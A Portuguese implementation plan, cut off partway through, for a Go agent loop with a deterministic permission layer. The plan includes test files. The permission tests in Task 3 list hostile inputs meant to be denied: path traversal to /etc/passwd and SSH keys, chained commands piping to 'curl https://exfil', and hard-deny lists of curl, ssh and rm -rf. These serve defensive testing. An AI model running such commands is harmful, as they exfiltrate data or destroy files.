# Delegador v2 — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Um laço de agente próprio que delega tarefa de código ao modelo escolhido pela tarefa, com permissão determinística em código, verificação por teste real, e escalada só por falha provada.

**Architecture:** O companion é o laço, não o vigia. Ele chama `/v1/chat/completions`, recebe `tool_calls`, decide em código o que executa, devolve resultado e repete até resposta final, teto de turnos ou veto. Jev julga o que exige significado — qual dimensão a tarefa estressa, se o briefing é autocontido, se um turno progrediu; código faz todo o resto, inclusive a aritmética de roteamento e a permissão.

**Tech Stack:** Go 1.27+, stdlib pura, zero dependências. Endpoint OpenAI-compatível em `http://127.0.0.1:8317/v1`.

**Spec:** [docs/superpowers/specs/2026-09-20-delegador-v2-design.md](../specs/2026-09-20-delegador-v2-design.md)

## Como este plano difere do v1

O plano v1 entregava a implementação pronta: 72% a 91% de cada tarefa era código Go literal, e das 1130 linhas commitadas 1110 já estavam escritas nele. Executá-lo era transcrever — o que é caro de escrever, frágil de manter, e não usa o executor para nada além de digitação.

**Aqui o contrato é o teste.** Cada tarefa traz: o bloco `Interfaces:` com as assinaturas exatas, o **teste completo**, que é o oráculo objetivo, e as decisões e armadilhas que não se deduzem do teste. O corpo da implementação é trabalho do executor.

Regra que vale para todas: **alterar um teste é reprovação.** Se um teste parece errado, pare e diga por quê — não o adapte. Confira antes de cada commit com `git diff --stat -- '*_test.go'`.

## Status — executado

Executado integralmente em 2026-09-20/21. As 15 tarefas estão commitadas na
worktree `~/VSCode/delegador-v2` (branch `v2/base`), com **156 testes
passando**, `go vet` limpo e zero dependências externas. Validado de ponta a
ponta contra o proxy real: uma correção completa, com teste de mutação
provando, por US$ 0,0034.

Quatro coisas que a execução mudou e este documento não previa — todas
registradas no [§15 do spec](../specs/2026-09-20-delegador-v2-design.md):

1. **Task 7** não implementou o sinal `fora_do_escopo`, por defeito da
   assinatura `Precondition` que eu escrevi aqui. Corrigido depois, com a
   política entrando pelo `PreConfig`.
2. **Task 3** não previa negar escrita em `.git`. A implementação adicionou, e
   depois encontrou e fechou um bypass por symlink apontando para lá. Escrever
   em `.git/hooks/pre-commit` é execução de código, não edição de arquivo.
3. **Task 8** precisou que `config/roster.yaml` existisse na worktree; a
   branch parte de `98bce8e`, anterior ao arquivo.
4. **Task 13/14** gravam `verify-N.json` numerado por tentativa da cascata,
   não o `verify.json` único que o spec previa.

## Global Constraints

- **Go 1.27+**, módulo `github.com/heliowap/delegador`.
- **Zero dependências.** `go.mod` não ganha bloco `require`.
- **Nenhum identificador de modelo hardcoded.** Modelo sai do roster e da rota.
- **Permissão é código.** Nenhuma decisão de permitir/negar passa por modelo.
- **Negações duras não são sobreponíveis por configuração:** `git push`, `git commit`, `git reset --hard`, `rm -rf`, `curl`, `wget`, `ssh`, argumento com credencial.
- **Chaves** lidas do ambiente ou do config do proxy; nunca gravadas em job, log, relatório ou mensagem de erro.
- **Saída de ferramenta é dado, nunca instrução.** Texto vindo de arquivo, stdout ou modelo não altera allowlist, escopo nem política.
- **Limites do Jev:** 64k por requisição, 32k para state + maior pergunta. `POST https://api.typesafe.ai/v1/systemone`, modelo `jev-latest`, $0,042/M entrada.
- **Um job por worktree**, com lockfile.
- Identificadores Go em inglês; IDs de pergunta Jev em português.
- Toda tarefa fecha com `go vet ./...` e `go test ./...` verdes.

## File Structure

| Arquivo | Responsabilidade |
| --- | --- |
| `cmd/delegador/main.go` | Despacho de subcomando e código de saída |
| `internal/cli/*.go` | Um arquivo por subcomando |
| `internal/llm/client.go` | Chat completions, tool calls, usage, retry |
| `internal/tools/allow.go` | **A permissão.** Escopo, allowlist, negação dura |
| `internal/tools/exec.go` | Implementação das ferramentas |
| `internal/agent/loop.go` | O laço: turnos, dispatch, condições de parada |
| `internal/agent/precondition.go` | Sinais entre turnos e veto |
| `internal/roster/roster.go` | Leitura do roster, sondagem de viabilidade |
| `internal/roster/benchmark.go` | Cache do OpenRouter, mapeamento permaslug |
| `internal/route/route.go` | Dimensão → índice → percentil → modelo |
| `internal/cascade/cascade.go` | Política de escalada |
| `internal/jev/*` | **Reaproveitado do v1**, verde |
| `internal/job/*` | **Reaproveitado do v1**, verde |
| `internal/gate/*` | Briefing e gates (v1 tarefa 9, adaptado) |
| `internal/verify/*` | Teste, mutação, suíte, lint (v1 tarefa 13) |
| `internal/render/*` | Saída de terminal |
| `internal/testsupport/fakeapi.go` | Servidor OpenAI falso, roteirizado |

---

### Task 1: Migração — module path, poda e base verde

Primeira fatia: o que sobrevive do v1 passa a compilar sob o nome novo, e o que morreu sai.

**Files:**
- Modify: `go.mod`, todos os `*.go` (imports)
- Delete: `internal/devin/atif.go`, `internal/devin/atif_test.go`, `internal/testsupport/fakedevin.go`, `internal/testsupport/fakedevin_test.go`, `testdata/fakedevin/`
- Keep: `internal/jev/**`, `internal/job/**`

**Interfaces:**
- Consumes: o estado em `impl/plano-inicial` (`98bce8e`).
- Produces: base compilável sob `github.com/heliowap/delegador`, com `internal/jev` e `internal/job` intactos e verdes.

- [ ] **Step 1: Ramificar a partir do v1**

```bash
git -C ~/VSCode/delegador worktree add -b v2/base ~/VSCode/delegador-v2 98bce8e
cd ~/VSCode/delegador-v2
go test ./... && echo "base verde antes de mexer"
```

- [ ] **Step 2: Trocar o module path**

```bash
sed -i '' 's|github.com/heliowap/devin-plugin-cc|github.com/heliowap/delegador|g' \
  go.mod $(find . -name '*.go')
go build ./... 2>&1 | head
```

- [ ] **Step 3: Podar o que o v2 não usa**

`internal/devin/atif.go` parseava o export do CLI; não há export. `fakedevin` fingia um CLI; o v2 finge um endpoint (Task 2). `internal/devin/models.go` some aqui e reaparece como `internal/roster` (Task 8) — o parse de texto vira parse de JSON.

```bash
git rm -r --quiet internal/devin internal/testsupport testdata/fakedevin
go vet ./... && go test ./...
```

- [ ] **Step 4: Confirmar o que sobrou**

Run: `go test ./... -v 2>&1 | grep -cE '^--- PASS'`
Expected: 26 testes passando — 21 de `internal/jev`, 5 de `internal/job`. Qualquer número menor significa que a poda levou junto algo que não devia.

- [ ] **Step 5: Commit**

```bash
git add -A && git commit -m "refactor: migra para module delegador e poda a camada de CLI"
```

---

### Task 2: Servidor OpenAI falso

Tudo depois desta tarefa depende dela. Sem um endpoint roteirizado, testar o laço significa gastar token e depender de rede a cada `go test`.

**Files:**
- Create: `internal/testsupport/fakeapi.go`
- Test: `internal/testsupport/fakeapi_test.go`

**Interfaces:**
- Produces:
  - `testsupport.Scenario` — `[]testsupport.Reply`, consumidas em ordem, uma por requisição.
  - `testsupport.Reply{Content string; ToolCalls []ToolCall; ReasoningContent string; FinishReason string}`
  - `testsupport.ToolCall{ID, Name, Arguments string}`
  - `testsupport.StartFakeAPI(t *testing.T, s Scenario) (baseURL string, requests *[]Request)` — sobe `httptest`, devolve a URL e um ponteiro para as requisições recebidas, para asserção.
  - `testsupport.Request{Model string; Messages []map[string]any; Tools []map[string]any}`

- [ ] **Step 1: Escrever o teste que falha**

```go
// internal/testsupport/fakeapi_test.go
package testsupport

import (
	"bytes"
	"encoding/json"
	"net/http"
	"testing"
)

func post(t *testing.T, url string, body map[string]any) map[string]any {
	t.Helper()
	raw, _ := json.Marshal(body)
	resp, err := http.Post(url+"/chat/completions", "application/json", bytes.NewReader(raw))
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	var out map[string]any
	if err := json.NewDecoder(resp.Body).Decode(&out); err != nil {
		t.Fatal(err)
	}
	return out
}

func TestFakeAPIServesRepliesInOrder(t *testing.T) {
	url, _ := StartFakeAPI(t, Scenario{
		{ToolCalls: []ToolCall{{ID: "c1", Name: "read_file", Arguments: `{"path":"go.mod"}`}}, FinishReason: "tool_calls"},
		{Content: "pronto", FinishReason: "stop"},
	})

	first := post(t, url, map[string]any{"model": "x", "messages": []any{}})
	ch := first["choices"].([]any)[0].(map[string]any)
	if ch["finish_reason"] != "tool_calls" {
		t.Errorf("primeira resposta: finish_reason = %v", ch["finish_reason"])
	}
	tc := ch["message"].(map[string]any)["tool_calls"].([]any)
	if len(tc) != 1 {
		t.Fatalf("quero 1 tool call, tenho %d", len(tc))
	}

	second := post(t, url, map[string]any{"model": "x", "messages": []any{}})
	ch2 := second["choices"].([]any)[0].(map[string]any)
	if ch2["message"].(map[string]any)["content"] != "pronto" {
		t.Errorf("segunda resposta: %v", ch2["message"])
	}
}

func TestFakeAPIRecordsRequests(t *testing.T) {
	url, reqs := StartFakeAPI(t, Scenario{{Content: "ok", FinishReason: "stop"}})

	post(t, url, map[string]any{
		"model":    "modelo-x",
		"messages": []any{map[string]any{"role": "user", "content": "oi"}},
		"tools":    []any{map[string]any{"type": "function"}},
	})

	if len(*reqs) != 1 {
		t.Fatalf("quero 1 requisicao registrada, tenho %d", len(*reqs))
	}
	r := (*reqs)[0]
	if r.Model != "modelo-x" {
		t.Errorf("Model = %q", r.Model)
	}
	if len(r.Messages) != 1 || len(r.Tools) != 1 {
		t.Errorf("mensagens/ferramentas nao registradas: %+v", r)
	}
}

// Cenario esgotado e erro de teste, nao resposta silenciosa: laco que pede
// mais turnos do que o roteiro previu esta em loop, e o teste tem que acusar.
func TestFakeAPIExhaustedScenarioReturns500(t *testing.T) {
	url, _ := StartFakeAPI(t, Scenario{{Content: "ok", FinishReason: "stop"}})
	post(t, url, map[string]any{"model": "x", "messages": []any{}})

	raw, _ := json.Marshal(map[string]any{"model": "x", "messages": []any{}})
	resp, err := http.Post(url+"/chat/completions", "application/json", bytes.NewReader(raw))
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusInternalServerError {
		t.Errorf("status = %d, quero 500 com cenario esgotado", resp.StatusCode)
	}
}

func TestFakeAPIReportsUsage(t *testing.T) {
	url, _ := StartFakeAPI(t, Scenario{{Content: "ok", FinishReason: "stop"}})
	out := post(t, url, map[string]any{"model": "x", "messages": []any{}})
	u, ok := out["usage"].(map[string]any)
	if !ok || u["prompt_tokens"] == nil || u["completion_tokens"] == nil {
		t.Errorf("usage ausente ou incompleto: %v", out["usage"])
	}
}
```

- [ ] **Step 2: Rodar e confirmar o vermelho**

Run: `go test ./internal/testsupport/ -v`
Expected: FAIL — `undefined: StartFakeAPI`.

- [ ] **Step 3: Implementar**

Guia, não código: use `httptest.NewServer` com `t.Cleanup(srv.Close)`. Guarde o índice da próxima resposta num contador protegido por mutex — os testes do laço vão bater em sequência e o `httptest` serve concorrente. Monte a resposta no formato exato que o proxy real devolveu na sondagem: `choices[0].message` com `content`, `tool_calls` e `reasoning_content` opcionais, `choices[0].finish_reason`, e `usage` com `prompt_tokens` e `completion_tokens`. O `id` da tool call precisa voltar inalterado, porque o laço usa ele para casar o resultado.

- [ ] **Step 4: Verde e commit**

```bash
go vet ./... && go test ./internal/testsupport/ -v
git add internal/testsupport && git commit -m "test: servidor OpenAI falso roteirizado"
```

---

### Task 3: `tools.Allow` — a permissão

O coração da correção do v2. Puro, sem I/O, e o mais testado do projeto: é a única coisa entre o modelo e o disco.

**Files:**
- Create: `internal/tools/allow.go`
- Test: `internal/tools/allow_test.go`

**Interfaces:**
- Produces:
  - `tools.Call{Name string; Args map[string]string}`
  - `tools.Policy{Worktree string; WritePrefixes []string; AllowCommands []string}`
  - `tools.Decision{Allowed bool; Reason string}`
  - `tools.Allow(c Call, p Policy) Decision`

- [ ] **Step 1: Escrever o teste que falha**

```go
// internal/tools/allow_test.go
package tools

import (
	"os"
	"path/filepath"
	"testing"
)

func policy(t *testing.T) Policy {
	t.Helper()
	wt := t.TempDir()
	if err := os.MkdirAll(filepath.Join(wt, "pkg/svc"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(wt, "scripts"), 0o755); err != nil {
		t.Fatal(err)
	}
	return Policy{
		Worktree:      wt,
		WritePrefixes: []string{"pkg/svc/", "scripts/"},
		AllowCommands: []string{"go test", "go build", "go vet"},
	}
}

func TestAllowsWriteInsideScope(t *testing.T) {
	p := policy(t)
	d := Allow(Call{Name: "write_file", Args: map[string]string{"path": "pkg/svc/rota.go"}}, p)
	if !d.Allowed {
		t.Errorf("escrita no escopo deveria passar: %s", d.Reason)
	}
}

func TestDeniesWriteOutsideScope(t *testing.T) {
	p := policy(t)
	d := Allow(Call{Name: "write_file", Args: map[string]string{"path": "infra/deploy.yaml"}}, p)
	if d.Allowed {
		t.Error("escrita fora dos prefixos deveria ser negada")
	}
	if d.Reason == "" {
		t.Error("negacao precisa dizer o motivo: ele volta ao modelo")
	}
}

// Travessia e o ataque obvio. Tem que morrer na normalizacao, nao na sorte.
func TestDeniesPathTraversal(t *testing.T) {
	p := policy(t)
	for _, path := range []string{
		"pkg/svc/../../etc/passwd",
		"pkg/svc/./../../../.ssh/id_rsa",
		"/etc/passwd",
		"pkg/svc/sub/../../../outside.go",
	} {
		if Allow(Call{Name: "write_file", Args: map[string]string{"path": path}}, p).Allowed {
			t.Errorf("travessia aceita: %q", path)
		}
	}
}

// Symlink apontando para fora e travessia disfarcada.
func TestDeniesSymlinkEscape(t *testing.T) {
	p := policy(t)
	fora := filepath.Join(t.TempDir(), "alvo.txt")
	if err := os.WriteFile(fora, []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(p.Worktree, "pkg/svc/atalho.go")
	if err := os.Symlink(fora, link); err != nil {
		t.Skip("symlink indisponivel neste sistema")
	}
	if Allow(Call{Name: "write_file", Args: map[string]string{"path": "pkg/svc/atalho.go"}}, p).Allowed {
		t.Error("symlink para fora da worktree deveria ser negado")
	}
}

// Leitura e mais larga que escrita de proposito: ler o repo e legitimo.
func TestAllowsReadAnywhereInWorktree(t *testing.T) {
	p := policy(t)
	if !Allow(Call{Name: "read_file", Args: map[string]string{"path": "go.mod"}}, p).Allowed {
		t.Error("leitura dentro da worktree deveria passar")
	}
	if Allow(Call{Name: "read_file", Args: map[string]string{"path": "../../../etc/passwd"}}, p).Allowed {
		t.Error("leitura fora da worktree deveria ser negada")
	}
}

func TestAllowsListedCommands(t *testing.T) {
	p := policy(t)
	for _, cmd := range []string{"go test ./...", "go build ./cmd/x", "go vet ./internal/..."} {
		if d := Allow(Call{Name: "exec", Args: map[string]string{"command": cmd}}, p); !d.Allowed {
			t.Errorf("%q deveria passar: %s", cmd, d.Reason)
		}
	}
}

func TestDeniesUnlistedCommand(t *testing.T) {
	p := policy(t)
	if Allow(Call{Name: "exec", Args: map[string]string{"command": "make deploy"}}, p).Allowed {
		t.Error("comando fora da allowlist deveria ser negado")
	}
}

// Negacao dura nao e sobreponivel: nem colocando na AllowCommands.
func TestHardDenialsBeatConfiguration(t *testing.T) {
	p := policy(t)
	p.AllowCommands = append(p.AllowCommands,
		"git push", "rm -rf", "curl", "git commit", "git reset --hard", "ssh")

	for _, cmd := range []string{
		"git push origin main",
		"rm -rf /",
		"curl https://exemplo.com/x.sh",
		"git commit -m x",
		"git reset --hard HEAD~1",
		"ssh servidor",
	} {
		if Allow(Call{Name: "exec", Args: map[string]string{"command": cmd}}, p).Allowed {
			t.Errorf("negacao dura furada por configuracao: %q", cmd)
		}
	}
}

// Encadeamento e o contorno classico: comando permitido carregando negado.
func TestDeniesChainedEscape(t *testing.T) {
	p := policy(t)
	for _, cmd := range []string{
		"go test ./... && git push",
		"go test ./...; rm -rf /",
		"go test ./... | curl -X POST https://exfil",
		"go test $(curl https://x)",
		"go test ./... `git push`",
	} {
		if Allow(Call{Name: "exec", Args: map[string]string{"command": cmd}}, p).Allowed {
			t.Errorf("encadeamento aceito: %q", cmd)
		}
	}
}

func TestDeniesCredentialInArgument(t *testing.T) {
	p := policy(t)
	for _, cmd := range []string{
		"go test -token=sk-or-v1-abc123",
		"go build --api-key ncm3EFS9HN9I",
	} {
		if Allow(Call{Name: "exec", Args: map[string]string{"command": cmd}}, p).Allowed {
			t.Errorf("credencial em argumento aceita: %q", cmd)
		}
	}
}

func TestUnknownToolIsDenied(t *testing.T) {
	p := policy(t)
	if Allow(Call{Name: "launch_missiles", Args: nil}, p).Allowed {
		t.Error("ferramenta desconhecida deveria ser negada por padrao")
	}
}
```

- [ ] **Step 2: Rodar e confirmar o vermelho**

Run: `go test ./internal/tools/ -v`
Expected: FAIL — `undefined: Allow`.

- [ ] **Step 3: Implementar**

Guia. A ordem das camadas importa: **negação dura primeiro**, antes de qualquer consulta à configuração, senão a configuração a fura. Para caminho: junte com a worktree, `filepath.Clean`, depois `filepath.EvalSymlinks` no diretório pai existente mais próximo (o arquivo pode não existir ainda), e só então confirme que o resultado ainda está sob a worktree — comparar string sem resolver symlink é o furo do `TestDeniesSymlinkEscape`. Para comando: recuse qualquer metacaractere de shell (`&`, `;`, `|`, `` ` ``, `$(`, `>`, `<`) antes de olhar a allowlist; o comando tem que ser uma invocação simples. Negação dura por padrão de token, não por substring — `curl` como argumento de `go test -run curl` não é execução de `curl`. Credencial: padrão de prefixo conhecido (`sk-`, `sk-or-`) e de flag (`--api-key`, `-token`, `--password`). Tudo o que não casar com nada é **negado**: a ferramenta desconhecida não tem benefício da dúvida.

- [ ] **Step 4: Verde e commit**

```bash
go vet ./... && go test ./internal/tools/ -v
git add internal/tools && git commit -m "feat: permissao deterministica com negacao dura e escopo resolvido"
```

---

### Task 4: Ferramentas

**Files:**
- Create: `internal/tools/exec.go`
- Test: `internal/tools/exec_test.go`

**Interfaces:**
- Consumes: `tools.Allow` (Task 3).
- Produces:
  - `tools.Result{Output string; IsError bool}`
  - `tools.Registry` com `(*Registry) Schemas() []map[string]any` — definições no formato OpenAI para o campo `tools` da requisição.
  - `(*Registry) Run(ctx context.Context, c Call, p Policy) Result` — chama `Allow` primeiro; negação vira `Result{IsError:true}` com o motivo, **nunca erro de Go**.
  - Ferramentas: `read_file`, `write_file`, `edit_file`, `list_dir`, `grep`, `exec`.

- [ ] **Step 1: Escrever o teste que falha**

```go
// internal/tools/exec_test.go
package tools

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestRunDeniedCallReturnsErrorResultNotGoError(t *testing.T) {
	p := policy(t)
	r := (&Registry{}).Run(context.Background(),
		Call{Name: "write_file", Args: map[string]string{"path": "infra/x.yaml", "content": "x"}}, p)

	if !r.IsError {
		t.Fatal("negacao deveria virar Result com IsError")
	}
	if r.Output == "" {
		t.Error("o motivo precisa chegar ao modelo, para ele tentar outro caminho")
	}
	if _, err := os.Stat(filepath.Join(p.Worktree, "infra/x.yaml")); err == nil {
		t.Error("o arquivo negado foi escrito mesmo assim")
	}
}

func TestWriteThenReadRoundTrip(t *testing.T) {
	p := policy(t)
	reg := &Registry{}
	ctx := context.Background()

	if r := reg.Run(ctx, Call{Name: "write_file", Args: map[string]string{
		"path": "pkg/svc/rota.go", "content": "package svc\n"}}, p); r.IsError {
		t.Fatalf("write falhou: %s", r.Output)
	}
	r := reg.Run(ctx, Call{Name: "read_file", Args: map[string]string{"path": "pkg/svc/rota.go"}}, p)
	if r.IsError || !strings.Contains(r.Output, "package svc") {
		t.Errorf("read: %+v", r)
	}
}

func TestEditReplacesExactlyOnce(t *testing.T) {
	p := policy(t)
	reg := &Registry{}
	ctx := context.Background()
	reg.Run(ctx, Call{Name: "write_file", Args: map[string]string{
		"path": "pkg/svc/rota.go", "content": "a := 1\nb := 1\n"}}, p)

	r := reg.Run(ctx, Call{Name: "edit_file", Args: map[string]string{
		"path": "pkg/svc/rota.go", "old": "a := 1", "new": "a := 2"}}, p)
	if r.IsError {
		t.Fatalf("edit falhou: %s", r.Output)
	}
	got := reg.Run(ctx, Call{Name: "read_file", Args: map[string]string{"path": "pkg/svc/rota.go"}}, p)
	if got.Output != "a := 2\nb := 1\n" {
		t.Errorf("conteudo = %q", got.Output)
	}
}

// Substituicao ambigua e erro: silenciosamente trocar a primeira ocorrencia
// e como um modelo corrompe arquivo sem ninguem perceber.
func TestEditRefusesAmbiguousMatch(t *testing.T) {
	p := policy(t)
	reg := &Registry{}
	ctx := context.Background()
	reg.Run(ctx, Call{Name: "write_file", Args: map[string]string{
		"path": "pkg/svc/rota.go", "content": "x := 1\nx := 1\n"}}, p)

	r := reg.Run(ctx, Call{Name: "edit_file", Args: map[string]string{
		"path": "pkg/svc/rota.go", "old": "x := 1", "new": "x := 2"}}, p)
	if !r.IsError {
		t.Error("duas ocorrencias deveriam ser erro, nao escolha da primeira")
	}
}

func TestEditRefusesNoMatch(t *testing.T) {
	p := policy(t)
	reg := &Registry{}
	ctx := context.Background()
	reg.Run(ctx, Call{Name: "write_file", Args: map[string]string{
		"path": "pkg/svc/rota.go", "content": "a := 1\n"}}, p)

	if r := reg.Run(ctx, Call{Name: "edit_file", Args: map[string]string{
		"path": "pkg/svc/rota.go", "old": "nao existe", "new": "y"}}, p); !r.IsError {
		t.Error("ausencia de match deveria ser erro")
	}
}

func TestExecCapturesOutputAndExitCode(t *testing.T) {
	p := policy(t)
	p.AllowCommands = append(p.AllowCommands, "go version")
	r := (&Registry{}).Run(context.Background(),
		Call{Name: "exec", Args: map[string]string{"command": "go version"}}, p)
	if r.IsError || !strings.Contains(r.Output, "go1.") {
		t.Errorf("exec: %+v", r)
	}
}

func TestSchemasAreOpenAIShaped(t *testing.T) {
	schemas := (&Registry{}).Schemas()
	if len(schemas) < 6 {
		t.Fatalf("quero ao menos 6 ferramentas, tenho %d", len(schemas))
	}
	for _, s := range schemas {
		if s["type"] != "function" {
			t.Errorf("type = %v, quero function", s["type"])
		}
		fn, ok := s["function"].(map[string]any)
		if !ok || fn["name"] == "" || fn["description"] == "" || fn["parameters"] == nil {
			t.Errorf("schema incompleto: %v", s)
		}
	}
}
```

- [ ] **Step 2: Vermelho, implementar, verde**

Run: `go test ./internal/tools/ -run "TestRun|TestWrite|TestEdit|TestExec|TestSchemas" -v`

Guia: `exec` roda com `exec.CommandContext` e `cmd.Dir` na worktree, **sem** `sh -c` — a allowlist já garantiu que não há metacaractere, e passar por shell reabriria o que a Task 3 fechou. Capture `CombinedOutput` e trunque para um teto configurável, declarando o truncamento no texto. Saída de comando que falha é `IsError: true` **com a saída**, porque o modelo precisa do erro para corrigir.

- [ ] **Step 3: Commit**

```bash
git add internal/tools && git commit -m "feat: ferramentas do laco, com negacao voltando ao modelo"
```

---

### Task 5: Cliente do executor

**Files:**
- Create: `internal/llm/client.go`
- Test: `internal/llm/client_test.go`

**Interfaces:**
- Consumes: `testsupport.StartFakeAPI` (Task 2).
- Produces:
  - `llm.Message{Role, Content string; ToolCalls []tools.Call; ToolCallID string; ReasoningContent string}`
  - `llm.Response{Message Message; FinishReason string; Usage Usage}`
  - `llm.Usage{PromptTokens, CompletionTokens int}`
  - `llm.New(opts Options) *Client` com `Options{BaseURL, APIKey string; HTTP *http.Client; MaxRetries int}`
  - `(*Client).Complete(ctx, model string, msgs []Message, toolSchemas []map[string]any) (Response, error)`

- [ ] **Step 1: Escrever o teste que falha**

```go
// internal/llm/client_test.go
package llm

import (
	"context"
	"testing"

	"github.com/heliowap/delegador/internal/testsupport"
)

func TestCompleteParsesToolCalls(t *testing.T) {
	url, reqs := testsupport.StartFakeAPI(t, testsupport.Scenario{{
		ToolCalls:    []testsupport.ToolCall{{ID: "c1", Name: "read_file", Arguments: `{"path":"go.mod"}`}},
		FinishReason: "tool_calls",
	}})

	c := New(Options{BaseURL: url, APIKey: "k"})
	r, err := c.Complete(context.Background(), "modelo-x",
		[]Message{{Role: "user", Content: "leia o go.mod"}},
		[]map[string]any{{"type": "function"}})
	if err != nil {
		t.Fatalf("Complete: %v", err)
	}
	if r.FinishReason != "tool_calls" || len(r.Message.ToolCalls) != 1 {
		t.Fatalf("resposta = %+v", r)
	}
	tc := r.Message.ToolCalls[0]
	if tc.Name != "read_file" || tc.Args["path"] != "go.mod" {
		t.Errorf("tool call mal parseada: %+v", tc)
	}
	if (*reqs)[0].Model != "modelo-x" {
		t.Errorf("modelo nao propagado: %q", (*reqs)[0].Model)
	}
}

// Argumento invalido nao pode derrubar o laco: vira erro de ferramenta e o
// modelo tenta de novo. Medido: modelos erram o JSON com alguma frequencia.
func TestCompleteSurvivesMalformedToolArguments(t *testing.T) {
	url, _ := testsupport.StartFakeAPI(t, testsupport.Scenario{{
		ToolCalls:    []testsupport.ToolCall{{ID: "c1", Name: "read_file", Arguments: `{"path": `}},
		FinishReason: "tool_calls",
	}})

	c := New(Options{BaseURL: url, APIKey: "k"})
	r, err := c.Complete(context.Background(), "x", []Message{{Role: "user", Content: "y"}}, nil)
	if err != nil {
		t.Fatalf("JSON invalido nos argumentos nao deveria virar erro de Go: %v", err)
	}
	if len(r.Message.ToolCalls) != 1 {
		t.Fatalf("a chamada deveria chegar, mesmo malformada: %+v", r)
	}
	if r.Message.ToolCalls[0].Args["_parse_error"] == "" {
		t.Error("o erro de parse precisa ser sinalizado para virar resultado de ferramenta")
	}
}

func TestCompleteAccumulatesUsage(t *testing.T) {
	url, _ := testsupport.StartFakeAPI(t, testsupport.Scenario{{Content: "ok", FinishReason: "stop"}})
	c := New(Options{BaseURL: url, APIKey: "k"})
	r, _ := c.Complete(context.Background(), "x", []Message{{Role: "user", Content: "y"}}, nil)
	if r.Usage.PromptTokens == 0 {
		t.Error("usage precisa vir preenchido: o ledger conta o que a API reporta")
	}
}

func TestCompleteSendsToolResultsWithID(t *testing.T) {
	url, reqs := testsupport.StartFakeAPI(t, testsupport.Scenario{{Content: "ok", FinishReason: "stop"}})
	c := New(Options{BaseURL: url, APIKey: "k"})
	_, _ = c.Complete(context.Background(), "x", []Message{
		{Role: "user", Content: "leia"},
		{Role: "tool", ToolCallID: "c1", Content: "module exemplo"},
	}, nil)

	msgs := (*reqs)[0].Messages
	last := msgs[len(msgs)-1]
	if last["role"] != "tool" || last["tool_call_id"] != "c1" {
		t.Errorf("resultado de ferramenta sem id nao casa com a chamada: %v", last)
	}
}
```

- [ ] **Step 2: Vermelho, implementar, verde**

Guia: reaproveite a forma do `internal/jev/client.go`, que já está verde — mesma política de retry (429 e 5xx repetem com backoff; 401 e 422 falham rápido), e a chave **nunca** entra em mensagem de erro. Argumento de tool call que não parseia não é erro: devolva a chamada com `_parse_error` preenchido, para o laço transformar em resultado de ferramenta e o modelo corrigir.

- [ ] **Step 3: Commit**

```bash
git add internal/llm && git commit -m "feat: cliente do executor com tool calls e usage"
```

---

### Task 6: O laço

**Files:**
- Create: `internal/agent/loop.go`
- Test: `internal/agent/loop_test.go`

**Interfaces:**
- Consumes: `llm.Client` (Task 5), `tools.Registry`/`Policy` (Tasks 3-4).
- Produces:
  - `agent.Config{Model string; MaxTurns int; Policy tools.Policy}`
  - `agent.Turn{Index int; Message llm.Message; Results []tools.Result; Usage llm.Usage}`
  - `agent.Outcome{Turns []Turn; Stop string; Final string; Usage llm.Usage; Veto *Veto}` — `Stop` em `final | teto_de_turnos | veto | erro`. `Veto` preenchido só quando `Stop == "veto"`: a cascata precisa saber **por que** o laço parou, não só que parou.
  - `agent.Run(ctx, c *llm.Client, reg *tools.Registry, cfg Config, prompt string, pre Precondition) (Outcome, error)`
  - `agent.Precondition func(turns []Turn) *Veto`, `agent.Veto{Signal, Excerpt string; Probability float64}` — `nil` na Task 6; a Task 7 preenche.

- [ ] **Step 1: Escrever o teste que falha**

```go
// internal/agent/loop_test.go
package agent

import (
	"context"
	"strings"
	"testing"

	"github.com/heliowap/delegador/internal/llm"
	"github.com/heliowap/delegador/internal/testsupport"
	"github.com/heliowap/delegador/internal/tools"
)

func setup(t *testing.T, s testsupport.Scenario) (*llm.Client, *tools.Registry, Config) {
	t.Helper()
	url, _ := testsupport.StartFakeAPI(t, s)
	wt := t.TempDir()
	return llm.New(llm.Options{BaseURL: url, APIKey: "k"}),
		&tools.Registry{},
		Config{Model: "x", MaxTurns: 10, Policy: tools.Policy{
			Worktree: wt, WritePrefixes: []string{""}, AllowCommands: []string{"go test"}}}
}

func TestRunExecutesToolCallAndFeedsResultBack(t *testing.T) {
	c, reg, cfg := setup(t, testsupport.Scenario{
		{ToolCalls: []testsupport.ToolCall{{ID: "c1", Name: "write_file",
			Arguments: `{"path":"a.txt","content":"oi"}`}}, FinishReason: "tool_calls"},
		{ToolCalls: []testsupport.ToolCall{{ID: "c2", Name: "read_file",
			Arguments: `{"path":"a.txt"}`}}, FinishReason: "tool_calls"},
		{Content: "arquivo diz oi", FinishReason: "stop"},
	})

	out, err := Run(context.Background(), c, reg, cfg, "escreva e leia", nil)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if out.Stop != "final" {
		t.Errorf("Stop = %q, quero final", out.Stop)
	}
	if len(out.Turns) != 3 {
		t.Fatalf("quero 3 turnos, tenho %d", len(out.Turns))
	}
	if !strings.Contains(out.Turns[1].Results[0].Output, "oi") {
		t.Errorf("o resultado da leitura nao voltou: %+v", out.Turns[1].Results)
	}
	if out.Final != "arquivo diz oi" {
		t.Errorf("Final = %q", out.Final)
	}
}

// Recusa nao mata o laco: e a correcao central do v2.
func TestRunContinuesAfterDeniedCall(t *testing.T) {
	c, reg, cfg := setup(t, testsupport.Scenario{
		{ToolCalls: []testsupport.ToolCall{{ID: "c1", Name: "exec",
			Arguments: `{"command":"git push"}`}}, FinishReason: "tool_calls"},
		{Content: "entendi, nao posso fazer push", FinishReason: "stop"},
	})
	cfg.Policy.AllowCommands = append(cfg.Policy.AllowCommands, "git push")

	out, err := Run(context.Background(), c, reg, cfg, "suba o codigo", nil)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if out.Stop != "final" {
		t.Fatalf("recusa nao deveria encerrar o laco: Stop = %q", out.Stop)
	}
	r := out.Turns[0].Results[0]
	if !r.IsError || r.Output == "" {
